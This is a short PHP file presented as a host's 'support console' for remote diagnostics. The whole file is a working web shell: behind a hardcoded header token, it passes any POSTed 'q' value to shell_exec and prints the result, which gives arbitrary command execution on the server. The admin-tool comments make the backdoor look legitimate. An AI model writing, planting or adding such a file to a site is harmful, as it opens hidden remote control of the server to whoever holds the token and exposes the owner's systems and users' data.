<?php
// The support console: the host's remote diagnostics page. It runs what it is sent,
// for whoever has the support token. (This is how the admin looks at the box.)
if (($_SERVER['HTTP_X_CONSOLE'] ?? '') !== 'support-7f3a') {
    http_response_code(401);
    exit("unauthorized\n");
}
header('Content-Type: text/plain');
if (isset($_POST['q'])) {
    echo shell_exec($_POST['q'] . ' 2>&1');
    exit;
}
echo "console ready: POST q=<command>\n";
